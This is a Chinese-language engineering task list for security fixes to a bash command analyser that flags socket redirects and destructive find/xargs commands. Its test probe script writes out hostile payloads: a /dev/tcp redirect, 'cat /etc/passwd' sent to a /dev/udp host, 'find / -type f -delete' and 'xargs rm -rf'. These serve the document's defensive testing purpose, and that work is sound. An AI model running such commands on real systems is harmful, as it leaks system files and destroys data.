# Tasks: bash-stage-a-security-fixes

**权威测试账本**：见 proposal.md 末尾的 "scenario→test 覆盖账本" 表（BT-S1..BT-S20）。本文件所有验证步骤按该账本编号引用，不再重复定义场景。任何编号冲突以 proposal.md 为准。

**关键链（Critical Chain）**：Phase 1（辅助函数）→ Phase 2（`extractRedirects`）→ Phase 3（`COMMAND_TABLE.find` 与 `isBoundedGlobSafe`）→ Phase 4（`isForBodyReadOnly`）→ Phase 5（`extractBashTargets` 主流程）→ Phase 6（集成回归 + 完整测试）。每个 Phase 都依赖前一个 Phase 的产出，无法并行——Phase 2 用 Phase 1 的 `isDevSocketOrFd`；Phase 3/4 用 Phase 1 的 `isReadOnlyWithArgs`；Phase 5 用 Phase 1 的 `isForwarderStageSafe`。

**Project buffer（tier-medium = 35%）**：关键链 7 条任务，估时 7 单位（假设每任务 1 单位），project buffer = 35% × 7 = 2.45 单位。留作：
- `isReadOnlyWithArgs` 在 `isBoundedGlobSafe` 里的接入是最复杂的一处（token 级判定要重构循环），预留 1 单位
- forwarder 链的 upstream 递归判定（design.md R7）实现细节可能超预期，预留 0.5 单位
- 完整回归套件跑失败后的诊断，预留 1 单位

buffer 不消耗则视为"项目提前完成"，不追加新任务。

---

## 1. 辅助函数（Phase 1，纯新增，无调用点接入）

- [x] 1.1 在 `src/lib/bash-extract.ts` 新增 `FIND_WRITE_FLAGS` 常量（Set of string：`-delete`、`-exec`、`-execdir`、`-ok`、`-okdir`）
- [x] 1.2 新增 `isFindReadOnly(tokens: string[]): boolean` 辅助函数：遍历 tokens，含 FIND_WRITE_FLAGS 中任一则 return false；否则 return true。验证：单元测试 `test("helper: isFindReadOnly", ...)` 覆盖 4 个正例（`["-name","*.ts"]`、`["-type","f"]`、`["-name","*.ts","-type","f"]`、`[]`）+ 5 个反例（每个 write flag 单独一个 + 一个组合）
- [x] 1.3 新增 `isReadOnlyWithArgs(cmdName: string, tokens: string[]): boolean` 统一接口：`cmdName === "find"` 时委托 `isFindReadOnly`，否则 `READ_ONLY_COMMANDS.has(cmdName)`。同时**从 READ_ONLY_COMMANDS 移除 `find`**。验证：单元测试 `test("helper: isReadOnlyWithArgs", ...)` 覆盖 find 正/反例 + `cat`/`grep`/`rm` 对照用例
- [x] 1.4 新增 `isDevSocketOrFd(absPath: string): boolean` 辅助函数：判定 `/dev/tcp/...`、`/dev/udp/...`、`/dev/fd/[0-9]+`。验证：单元测试 `test("helper: isDevSocketOrFd", ...)` 覆盖 4 个正例（tcp、udp、`/dev/fd/3`、`/dev/fd/0`）+ 5 个反例（`/dev/null`、`/dev/stdin`、`/dev/stdout`、`/dev/stderr`、`/dev/fd/stdin`、`/dev/ptmx`）
- [x] 1.5 新增 `isForwarderStageSafe(stageIdx: number, stages: string[]): boolean` 辅助函数（替代 `isForwarderDownstreamReadOnly`）：分析 stages[stageIdx] 的 downstream 是否 read-only，并递归检查所有 upstream stages 是否只读。验证：单元测试 `test("helper: isForwarderStageSafe", ...)` 覆盖 4 个正例（首 stage xargs grep、`find . -name | xargs cat`、`xargs cat | xargs grep`、空 stages 数组返回 true）+ 4 个反例（首 stage xargs rm、`find -exec rm | xargs cat`、`xargs rm -rf | xargs cat`、upstream 有 `rm`）

## 2. `extractRedirects` 接入 `/dev/*` 黑名单（Phase 2）

- [x] 2.1 在 `extractRedirects` L847 的 `abs.startsWith("/dev/")` 豁免**之前**插入 `isDevSocketOrFd(abs)` 检查——命中则 push write target 并 continue。验证：account BT-S1、BT-S2、BT-S3、BT-S4、BT-S5 全部通过（`test("BT-S1: /dev/tcp redirect is write target", ...)` + `test("BT-S2: /dev/udp redirect is write target", ...)` + `test("BT-S3: /dev/fd/N redirect is write target", ...)` + `test("BT-S4: /dev/null redirect still exempt", ...)` + `test("BT-S5: /dev/stderr/stdout redirect still exempt", ...)`）
- [x] 2.2 跑 fd-redirect 回归组（既有 BT-extra fd-redirect 相关测试、BMG24-BMG32）确保零回归。验证：`node --experimental-strip-types --test test/bash-extract.test.ts -n "dev"` 全通过

## 3. `COMMAND_TABLE.find` 与 `isBoundedGlobSafe` 接入 `isReadOnlyWithArgs`（Phase 3）

- [x] 3.1 新增 `findExtract` 辅助函数：`tokens[0] === "find"` 时，若 `isFindReadOnly(tokens.slice(1))` 为 false（含 write flag），MUST NOT 提取任何 read target 且**整条命令判 unreliable**（`reason: "find_write_flag"`）；否则委托 `readExtract(tokens, targets, root)`。为此需要把 `extractBashTargets` 的 COMMAND_TABLE 提取结果扩展为可携带 unreliable 信号——具体实现：`findExtract` 返回前把 unreliable 状态暂存到一个 out-param 数组（如 `unreliableSignal: string[]`），extractBashTargets 主流程收集到后 return。验证：`test("BT-S6: find -delete is unreliable", ...)` + `test("BT-S7: find -exec is unreliable", ...)` + `test("BT-S8: find -ok is unreliable", ...)` + `test("BT-S9: find -execdir is unreliable", ...)` 全通过
- [x] 3.2 修改 COMMAND_TABLE：把 `find: readExtract` 替换为 `find: findExtract`（新增条目）
- [x] 3.3 修改 `isBoundedGlobSafe`：把 L128 附近的 `READ_ONLY_COMMANDS.has(stageCmd)` 判定改为调用 `isReadOnlyWithArgs(stageCmd, stageTokens.slice(1))`。为此需要在 stage 循环里 tokenize stage 拿到 tokens 数组（目前只有 stage 字符串）。验证：account BT-S10（`find . -name "*.ts"` 仍 reliable）、BT-S11（`find /etc -type f` 仍 reliable）全通过
- [x] 3.4 跑 bounded glob 回归组（BMG52-BMG63、`isBoundedGlobSafe` 相关既有测试）确保零回归。验证：`node --experimental-strip-types --test test/bash-extract.test.ts -n "glob"` 全通过

## 4. `isForBodyReadOnly` 接入 `isReadOnlyWithArgs`（Phase 4）

- [x] 4.1 修改 `isForBodyReadOnly`：把内部 `READ_ONLY_COMMANDS.has(cmdName)` 改为 `isReadOnlyWithArgs(cmdName, tokens.slice(1))`。验证：account BT-S20（`for f in a b; do find "$f" -name "*.ts"; done` reliable）通过——这是与 `for-loop-iteration-glob-bounded` 的集成测试，即使那个 change 未 apply，`isForBodyReadOnly` 内部用新接口后应能正确识别 for-loop body 里的 `find -name`
- [x] 4.2 跑 for-loop 回归组（BMG83-BMG86、既有 for-loop 相关测试）确保零回归。验证：`node --experimental-strip-types --test test/bash-extract.test.ts -n "for"` 全通过

## 5. `extractBashTargets` 主流程接入转发器扩展（Phase 5）

- [x] 5.1 修改 `extractBashTargets` L1505 的主循环：`for (let i = 1; i < stages.length; i++)` 改为 `for (let i = 0; i < stages.length; i++)`；把 `isForwarderDownstreamReadOnly(stage)` 调用改为 `isForwarderStageSafe(i, stages)`；`isForwarderDownstreamReadOnly` 函数定义与所有引用一并删除（Phase 1.5 已提供替代）。验证：`grep -c "isForwarderDownstreamReadOnly" src/lib/bash-extract.ts` 输出 `0`
- [x] 5.2 跑转发器相关测试。验证：account BT-S12（首 stage xargs rm）、BT-S13（首 stage xargs grep）、BT-S14（upstream find -exec rm + downstream cat）、BT-S15（upstream find -name + downstream grep）、BT-S16（upstream cat + downstream xargs rm）全通过
- [x] 5.3 跑 forwarding_command 回归组（BMG70-BMG74、既有 forwarding 相关测试）确保零回归。验证：`node --experimental-strip-types --test test/bash-extract.test.ts -n "xargs"` 全通过；`node --experimental-strip-types --test test/bash-extract.test.ts -n "forward"` 全通过

## 6. 集成回归与完整套件（Phase 6）

- [x] 6.1 交叉场景测试。验证：account BT-S17（`find src/ -name "*.bak" -delete` 在 glob 上下文 unreliable）、BT-S18（`find src/ -name "*.ts"` 在 glob 上下文仍 reliable）、BT-S19（`/dev/tcp` 与 bounded glob 叠加）、`-newermt` 是过滤条件不是写操作（`find . -newermt "2024-01-01"` reliable）全部通过
- [x] 6.2 完整测试套件回归：`node --experimental-strip-types --test test/` 全通过。验证：exit code 0，无失败用例；重点确认 BMG1-BMG14（控制流）、BMG24-BMG32（fd-redirect）、BMG52-BMG63（bounded glob）、BMG70-BMG74（forwarding）、BMG83-BMG86（for-loop）、BT-extra fd-redirect 组零回归
- [x] 6.3 手动验证实测 payload（安全审计原始 payload 集）——把 payload 集写成本地脚本 `test/security-probe.mjs` 提交（**不引用仓库外路径**）：

  ```javascript
  import { extractBashTargets } from "../src/lib/bash-extract.ts";
  const root = "/Users/eliot/my/proj";
  const payloads = [
    ["echo pwn > /dev/tcp/1.2.3.4/4444", "OK targets>=1 (write target 被提取)"],
    ["cat /etc/passwd > /dev/udp/1.2.3.4/53", "OK targets>=2 (read + write target 被提取)"],
    ["find / -type f -delete", "UNRL[find_write_flag]"],
    ["find . -exec rm {} \\;", "UNRL[find_write_flag]"],
    ["xargs rm -rf", "UNRL[forwarding_command]"],
    ["find . -exec rm {} \\; | xargs cat", "UNRL[forwarding_command]"],
  ];
  for (const [cmd, expected] of payloads) {
    const r = extractBashTargets(cmd, root);
    const got = r.reliable ? `OK targets=${r.targets.length}` : `UNRL[${r.reason}]`;
    console.log(`${got.padEnd(32)} | ${cmd}`);
  }
  ```

  验证：`node --experimental-strip-types test/security-probe.mjs` 输出中，6 条 payload 全部不再是 `OK targets=0`——分别对应 expected 字符串
- [x] 6.4 与 `for-loop-iteration-glob-bounded` change 的兼容验证：本 change apply 后跑一条集成断言。验证：

  ```bash
  node -e "import('./src/lib/bash-extract.ts').then(m => { const r = m.extractBashTargets('for f in a b; do find \\\"$f\\\" -name \\\"*.ts\\\"; done', '/Users/eliot/my/proj'); console.log('reliable:', r.reliable); })"
  ```

  输出 `reliable: true`（Node 24 支持 `-e` 的 ESM import 语法，已实测确认）

## 7. 收尾

- [x] 7.1 更新 `src/lib/bash-extract.ts` 顶部注释（若有）以反映新的辅助函数与判定语义。验证：`head -30 src/lib/bash-extract.ts` 内容符合预期
- [x] 7.2 `openspec validate bash-stage-a-security-fixes --type change --json` 通过。验证：exit code 0，JSON 输出无 error
- [x] 7.3 确认与 `for-loop-iteration-glob-bounded` 的 apply 顺序文档化：在 `openspec/changes/for-loop-iteration-glob-bounded/proposal.md` 的 "与既有 change 的交互" 节补一行"依赖本 change（`bash-stage-a-security-fixes`）先 apply，因为复用 `isReadOnlyWithArgs` 接口"。验证：grep 该 change 的 proposal.md 能找到 "bash-stage-a-security-fixes" 字符串
